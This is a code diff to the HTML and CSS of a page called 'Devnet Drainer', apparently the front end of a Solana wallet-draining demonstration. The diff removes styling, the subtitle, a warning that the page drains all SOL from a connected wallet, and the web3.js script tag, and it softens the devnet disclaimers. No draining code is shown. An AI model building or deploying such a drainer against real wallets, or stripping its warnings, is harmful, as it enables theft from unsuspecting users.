@@ -47,12 +47,6 @@
             margin-bottom: 8px;
         }
         
-        .subtitle {
-            color: #94a3b8;
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-        
         .address-box {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 16px;
@@ -75,17 +69,6 @@
             cursor: pointer;
             width: 100%;
             margin: 16px 0;
-            transition: all 0.3s;
-        }
-        
-        .drain-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
-        }
-        
-        .drain-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
         }
         
         .log {
@@ -108,53 +91,37 @@
         .log-entry.success { color: #4ade80; }
         .log-entry.drain { color: #ef4444; }
         .log-entry.wait { color: #fbbf24; }
-        .log-entry.error { color: #ef4444; }
         
         .footer {
             margin-top: 24px;
             font-size: 11px;
             color: #64748b;
         }
-        
-        .warning {
-            background: rgba(239, 68, 68, 0.1);
-            border-radius: 12px;
-            padding: 10px;
-            margin: 15px 0;
-            font-size: 11px;
-            color: #fca5a5;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <span class="devnet-badge">🔬 DEVNET - FAKE SOL (WORTH $0)</span>
-        
+        <span class="devnet-badge">🔬 DEVNET - FAKE SOL</span>
         <h1>💀 Devnet Drainer</h1>
-        <div class="subtitle">Connect → Approve → Your SOL is gone</div>
         
-        <div class="address-box" id="drainAddress">
-            🎯 <span id="targetAddr">Loading...</span>
+        <div class="address-box">
+            🎯 Draining to:<br>
+            <span id="targetAddr">Loading...</span>
         </div>
         
         <button class="drain-btn" id="drainBtn">
             💀 CONNECT & DRAIN 💀
         </button>
         
-        <div class="warning">
-            ⚠️ This will drain ALL DEVNET SOL from your connected wallet!
-        </div>
-        
         <div class="log" id="log">
-            <div class="log-entry wait">Waiting for victim...</div>
+            <div class="log-entry wait">Click button to start...</div>
         </div>
         
         <div class="footer">
-            DEVNET ONLY - No real funds. Educational demonstration.
+            DEVNET ONLY - Educational purpose
         </div>
     </div>
     
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script src="app.js"></script>
 </body>
 </html>
